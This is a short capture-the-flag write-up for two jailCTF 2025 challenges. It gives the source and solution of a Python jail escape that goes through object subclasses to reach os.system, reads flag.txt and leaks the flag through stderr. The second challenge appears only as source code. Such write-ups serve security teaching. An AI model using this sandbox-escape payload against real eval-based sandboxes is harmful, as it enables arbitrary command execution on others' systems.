jailCTF 2025 blindness#

main.py：

#!/usr/local/bin/python3
import sys
inp = input('blindness > ')
sys.stdout.close()
flag = open('flag.txt').read()
eval(inp, {'__builtins__': {}, 'flag': flag})
print('bye bye')

关闭了stdout，同时eval中删除了__builtins__中的内置函数，常规的recv是接收不到stderr的，利用stderr来泄露flag：

blindness > ().__class__.__base__.__subclasses__()[161].__init__.__globals__['__builtins__']["__import__"]("os").system("`cat flag.txt`")

sh: 1: jail{stderr_leak_5fd787f079eb69e}: not found

jailCTF 2025 ASMaaS#

asm.py：

#!/usr/local/bin/python3
import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import asm

try:
    shellcode = asm(input('> '), arch='amd64', os='linux')
except Exception as e:
    print('Could not compile shellcode. Exiting...')
    exit()

print('Compiled shellcode to X86!')
print(shellcode.hex(' '))
